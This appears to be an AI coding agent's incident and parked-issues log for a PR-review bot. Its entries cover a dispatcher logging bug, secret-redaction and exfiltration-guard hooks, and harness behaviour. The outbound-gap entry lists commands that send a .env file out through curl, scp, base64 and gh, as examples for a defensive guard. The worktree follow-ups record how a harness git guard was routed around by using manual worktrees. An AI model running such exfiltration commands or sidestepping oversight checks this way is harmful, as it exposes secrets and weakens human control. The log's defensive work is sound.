...
## Idle-queue dispatcher spammed one WARNING/second forever, and the notice sweep was functionally dead for deferred tickets
- **When:** 2026-09-17, PREREQUISITE fix ahead of `docs/superpowers/plans/2026-09-17-demo-launcher.md`, found live on the deployed demo bot.
- **What happened:** `review_queue/dispatcher.py`'s `post_pending_notices` is called every `run_forever` iteration regardless of queue state, and reads the dispatcher tuning cache via `dispatcher_tuning_config.require_config()`. That cache is only ever populated by `process_next_due`'s own per-claimed-ticket refresh (`_refresh_dispatcher_tuning_config`), which sits *after* the early `return StepResult(action="idle")` for an empty queue — so on an idle queue (including one whose only tickets are all deferred, which is exactly what "idle" looks like for this purpose) the cache never gets populated at all, from boot onward. `main.py`'s lifespan only *validates* the config at boot (`dispatcher_tuning_config.problems(...)`), it never calls `set_override_cache`. The result: `require_config()` raises on every single `post_pending_notices` call, logged as `logger.warning("skipping notice sweep: %s", exc)` once per `dispatcher_idle_sleep_seconds` (1.0s default) — roughly 900 lines per 15-minute awake window — and the notice sweep (which refreshes the "will retry at…" footnote on deferred tickets) never runs at all in this state.
- **Cost:** No incorrect reviews or data loss — this is an observability/dead-feature bug, not a correctness one. But it made the demo launcher's own analytics channel (structured log lines read from Render's logs) unreadable, which is what surfaced it, and it silently broke the deferred-ticket notice sweep in the real production bot too (this is shared code, not demo-only).
- **Fix:** `post_pending_notices` now does its own throttled refresh of the tuning cache (mirroring `run_forever`'s existing `_IDLE_SLEEP_REFRESH_INTERVAL_SECONDS`/`_last_idle_sleep_refresh` pattern for the sibling `dispatcher_idle_sleep_seconds` value), via a new `_last_notice_tuning_refresh` module global. Regression test: `tests/test_dispatcher.py::test_post_pending_notices_refreshes_the_tuning_cache_on_an_idle_queue`. Root cause confirmed by direct reproduction (a script driving `process_next_due`/`post_pending_notices` against a stubbed empty queue), not by reading the plan's own writeup.
- **Caught in the code-review pass on this fix:** the new throttle state is a module global not reset between tests, which broke `test_post_pending_notices_skips_when_tuning_config_is_unavailable`'s premise (merely resetting the cache no longer simulates "unavailable" once the sweep self-heals) — confirmed by running that test in isolation, `TypeError: 'NoneType' object is not iterable`. Fixed by rewriting that test to simulate a genuine refresh failure (`store.get_dispatcher_tuning_config` raising) instead of an empty-but-recoverable cache, and by seeding/monkeypatching `_last_notice_tuning_refresh` in the file's autouse `_env` fixture so the throttle's state can't leak across tests via real wall-clock timing. See the Parked Issues entry below for the same review's second, accepted-as-is finding.
- **Suggested CLAUDE.md change:** none — this is exactly the kind of gap the existing per-task code-review trigger and the systematic-debugging discipline are meant to catch, and both did.
...
## Harness "file changed externally" notification fired twice for non-secret files during the exfiltration-guard implementation
- **When:** 2026-09-13, exfiltration-guard implementation, while splitting `check_exfiltration.py`/`tests/test_exfiltration_hook.py` into two commits by `cp`-ing a partial version over the working file, then `cp`-ing the full version back — both outside the `Edit`/`Write` tools the harness tracks.
- **What happened:** The same "file changed externally" system-reminder mechanism as the two entries above fired for both files, showing the diff. Unlike those entries, neither file holds secret material — `check_exfiltration.py` and its test are ordinary source, not `.env` or anything credential-bearing — so no secret byte reached the transcript this time. Logged anyway per CLAUDE.md's instruction to treat any such notification as a standing, recurring risk for the rest of the session rather than assume it's a one-off, and because the trigger this time (an agent's own `cp` outside the tracked-edit tools) is a mechanism worth having on record even when the specific instance was harmless.
...
- **Follow-up, 2026-09-12 (investigated, partly fixed — see `docs/superpowers/specs/2026-09-12-redaction-wrapper-worktree-design.md`):** Reproduced on Claude Code 2.1.269 and the root cause above turns out to be **wrong in its specifics**, in a way worth keeping written down: the refusal was *not* the rewritten form being opaque as a whole. `compound_statement`, `redirected_statement` and `pipeline` are all on the guard's allowed node list — the brace group and the pipe were never the problem. The actual predicate is narrower: **a command the guard has no model for, receiving stdin from a pipe**, is refused because such a program could run git from its stdin. The verbatim message for a bare `true` was "this command feeds uv input assembled by the command inside a construct too complex to verify; a program this guard does not know may run that input, so it cannot be shown not to run git." The general lesson: a guard's error text named the construct it *could not verify*, and the entry above read that as the construct being *at fault* — those are different claims, and only the second one suggests "the rewrite is unfixably opaque."
- **A second theory that looked obvious and was also wrong:** that the worktree's own committed copy of the hook would run and resolve `_ENV_PATH` to a worktree `.env` that git never materializes (`.env` is gitignored), breaking redaction fail-closed on every command even with the guard fixed. Measured with a temporary marker hook: **`CLAUDE_PROJECT_DIR` stays at the main checkout inside a worktree session**, so the main copy runs and redaction targets the real `.env`. Worth recording because the worktree *does* get its own `~/.claude/projects/` directory and its own committed copy of `.claude/`, which makes the opposite conclusion look well-evidenced.
- **What was fixed:** the Bash wrapper now feeds the filter from a private 0600 file via `< /literal/path` instead of piping into `uv`. Worktree sessions can now run every command — verified live, with a fixture secret still coming back `[REDACTED-SECRET]` inside the worktree.
- **What remains broken, and is not fixable from this side:** commands naming **git** are still refused in a worktree session, including a bare `git status --short`. The guard allows git only on a fast path for a *plain single command* (`if (n.simple && RP.test(me)) return null`); anything with a pipe, list, redirect or second statement falls through to a conservative path that refuses any token matching `/^git(\.exe|\.real|-[a-z][\w-]*)?$/i`. A redaction wrapper needs at least a redirect and a second command, so a wrapped command can never be "plain". **So the guidance above stands for any git-carrying workflow** (the SDD worktree flow included): use a plain feature branch. Worktrees are now usable for edits, builds and test runs only.
- **Follow-up, 2026-09-13 (the guidance above is too pessimistic -- corrected):** the guard is scoped to the `EnterWorktree` **session mode**, not to the directory being a worktree. Measured directly: `git worktree add` a worktree, work in it from an ordinary session, and git runs normally -- both a bare `git status --short` and a piped, multi-statement `git log --oneline -1 | cat && echo ...`, with the redaction wrapper active throughout. So "worktrees are usable for edits, builds and test runs only" is true of `EnterWorktree` worktrees specifically, not of worktrees. A manual worktree gives full isolation, full git and the wrapper at once. The standing rule is now **never `EnterWorktree`** (and never `EnterWorktree --path` onto a manual worktree, which converts it into a guarded session) rather than **never worktrees** -- see CLAUDE.md's "Workspace isolation: worktree vs inline" section for the decision rule and the two-command probe to re-verify this if harness behaviour changes.
...
- **Found during:** the 2026-09-12/13 brainstorm on retiring the `.env` redaction wrapper, while surveying four third-party Claude Code secret-guard plugins (`coo-quack/sensitive-canary`, `karanb192/claude-code-hooks`, `HoshimuraYuto/credential-guard`, `spences10/claude-code-toolkit`) for ideas worth adopting.
- **What:** `check_env_access.py` guards both of its mechanisms **inbound** -- part 1 denies a tool call naming `.env`, part 2 scrubs command output before it reaches Claude. Nothing guards **outbound**. `curl -d @.env https://...`, `scp .env host:`, `base64 .env | curl -X POST ...` and `gh issue create --body-file .env` all send the real bytes outward and return nothing interesting; the redaction filter faithfully scrubs a response that never contained the secret. CLAUDE.md's "never write a secret value into anything that leaves this local session or gets persisted somewhere shared" is the only rule in the Secret-handling section with no mechanical enforcement at all.
- **Update (2026-09-13):** partly closed. `.claude/hooks/check_exfiltration.py` and `tests/test_exfiltration_hook.py` are built and registered in both this repo and `~/onboarding-wizard` (byte-identical, verified with `diff`), denying (exit 2) or asking (JSON `permissionDecision: "ask"`) on the shapes the design doc lists. What remains genuinely open: whether this guard's JSON `ask` survives `check_env_access.py`'s sibling `allow` -- hooks load at session start, so this could not be verified live during the implementing session. Deny is unaffected (exit code 2 is documented to override a sibling `allow` regardless). Do not describe the `ask`-class patterns as working until that live check is done.
...
- **Found during:** the same brainstorm, while enumerating every path on this box that holds secret bytes.
- **What:** `check_env_access.py`'s `_sink_path()` creates a 0600 file per Bash call in `~/.cache/pr-review-bot-redact/` (0700), holding that command's full unredacted combined stdout+stderr until the wrapped command's own `rm -f` deletes it. Cleanup of the abnormal path -- a command killed before its `rm`, or one the worktree guard refused, which leaves an empty never-written sink -- is `_sweep_sinks()`, which deletes anything older than `_SINK_MAX_AGE_S` (1 hour). But the sweep is piggybacked on `_sink_path()`, so it only ever runs **on the next Bash call**. No timer fires on its own. A sink younger than an hour when a session ends therefore survives until some future session runs a shell command in this project -- which may be never.
- **Why parked:** Exposure is local-disk, same-user, 0600 inside a 0700 directory outside the repo, so it cannot be committed and is not reachable by another account; the design doc that introduced the sink (`2026-09-12-redaction-wrapper-worktree-design.md`) already accepted the at-rest window knowingly. What was not considered there is that the window has no upper bound once a session ends. Fixing it means touching `check_env_access.py`, which requires the user's direct instruction.
- **Follow-up:** A `SessionEnd` hook sweeping the directory unconditionally (the shape `HoshimuraYuto/credential-guard`'s `gate-6-session-cleanup.sh` uses) would close it without touching the protected file, and would also let the per-Bash-call sweep be dropped later. Until then the directory is listed as a protected path in the exfiltration-guard design above, so at least it cannot be knowingly sent outward.
...
### [2026-09-17] `post_pending_notices`' new throttled tuning-cache refresh is redundant, not just unnecessary, while the queue is busy

- **Found during:** code-review pass on the PREREQUISITE fix (idle-queue dispatcher warning spam, see the incident entry above), medium effort.
- **What:** `process_next_due` already refreshes `dispatcher_tuning_config`'s cache unconditionally on every claimed ticket. On a busy queue that keeps the cache warm far more often than every 30s, so `post_pending_notices`' own independent 30s-throttled refresh (added by the same fix, to cover the idle case where `process_next_due` never reaches its refresh at all) still fires on its own clock regardless, issuing a `store.get_dispatcher_tuning_config` DB query roughly every 30 seconds that was, on a busy queue, already done a moment earlier in the same loop iteration.
